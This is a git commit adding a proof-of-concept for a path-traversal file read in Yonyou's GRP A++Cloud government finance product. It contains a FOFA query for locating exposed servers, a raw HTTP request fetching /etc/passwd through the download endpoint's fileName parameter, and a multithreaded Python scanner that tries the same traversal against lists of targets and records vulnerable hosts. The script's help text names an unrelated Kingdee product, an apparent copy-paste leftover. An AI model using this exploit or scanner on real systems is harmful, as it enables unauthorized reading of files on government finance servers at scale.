67011079347a4f8e4e3adbf2e04940081fa7aa36
hardog123 <3331551889@qq.com>
2024-06-15 17:49:30 +0800

    Add files via upload

---
+++ POC/用友GRP A++Cloud 政府财务云 任意文件读取漏洞/Readme.md
@@ -0,0 +1,32 @@
+# 用友GRP A++Cloud 政府财务云 任意文件读取漏洞
+
+## 1.漏洞描述
+
+用友 GRP-A++Cloud 政府财务云产品是以政府会计准则和预算管理一体化规范为基准，服务于政府行政事业单位，落实国家信创和行政事业单位内部控制规范要求，支持省级集中部署以及内部、外部业务协同，通过构建云原生服务，支撑业务的持续演化和变革，为政府业财一体化、财务规范化、自动化、智能化服务，打造安全、可靠、可控的信息化运行环境，提升各单位数字化治理能力。
+
+在download页面参数为fileName处存在任意文件的读取漏洞
+
+## 2.搜索语法
+
+```markdown
+fofa：body="/pf/portal/login/css/fonts/style.css"
+```
+
+## 3.漏洞复现
+
+```markdown
+GET /ma/emp/maEmp/download?fileName=../../../etc/passwd  HTTP/1.1
+Host: 
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+If-Modified-Since: Wed, 11 Oct 2023 05:16:05 GMT
+Connection: close
+
+
+```
+
+![image-20240615174847474](D:\py\POC\用友GRP A++Cloud 政府财务云 任意文件读取漏洞\image-20240615174847474.png)
---
+++ POC/用友GRP A++Cloud 政府财务云 任意文件读取漏洞/用友GRP A++Cloud 政府财务云 任意文件读取漏洞.py
@@ -0,0 +1,74 @@
+#导包
+import argparse,sys,requests
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()   #解除警告
+
+GREEN = '\033[92m'  # 输出颜色
+RESET = '\033[0m'
+def banner():
+    banner = '''         
+ 
+ ██░ ██  ▄▄▄       ██▀███  ▓█████▄  ▒█████    ▄████ 
+▓██░ ██▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌▒██▒  ██▒ ██▒ ▀█▒
+▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌▒██░  ██▒▒██░▄▄▄░
+░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌▒██   ██░░▓█  ██▓
+░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒░▒████▓ ░ ████▓▒░░▒▓███▀▒
+ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ ░ ▒░▒░▒░  ░▒   ▒ 
+ ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░   ░ 
+ ░  ░░ ░  ░   ▒     ░░   ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░   ░ 
+ ░  ░  ░      ░  ░   ░        ░        ░ ░        ░ 
+                            ░                       
+       
+                             version:1.0.0
+                             author:Hardog
+'''
+    print(banner)
+def poc(target):
+    url = target+"/ma/emp/maEmp/download?fileName=../../../etc/passwd"
+    headers={
+            'Cache-Control':'max-age=0',
+            'Upgrade-Insecure-Requests':'1',
+            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Encoding':'gzip, deflate, br',
+            'Accept-Language':'zh-CN,zh;q=0.9',
+            'If-Modified-Since':'Wed, 11 Oct 2023 05:16:05 GMT',
+            'Connection':'close',
+            }
+    try:
+        res = requests.get(url,headers=headers,verify=False,timeout=5)
+        if res.status_code==200 and "root" in res.text:
+            print(f"[+] {GREEN}存在漏洞{target}\n{RESET}")
+            with open("result.txt", "a+", encoding="utf-8") as f:
+                f.write(target+"\n")
+        else:
+            print(f"[-] 不存在漏洞")
+    except:
+        print(f"[*]无法访问")
+def main():
+    banner()
+    #处理命令行参数
+    parser = argparse.ArgumentParser(description='金蝶云星空 CommonFileserver 任意文件读取漏洞')
+    #添加两个参数
+    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
+    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
+    #调用
+    args = parser.parse_args()
+    # 处理命令行参数了
+    # 如果输入的是 url 而不是 文件 调用poc 不开多线程
+    # 反之开启多线程
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list=[]
+        with open(args.file,"r",encoding="utf-8") as f:
+            for url in f.readlines():
+                url_list.append(url.strip().replace("\n",""))
+        mp = Pool(100)
+        mp.map(poc, url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+if __name__ == '__main__':   #主函数入口
+    main()     #入口  main()
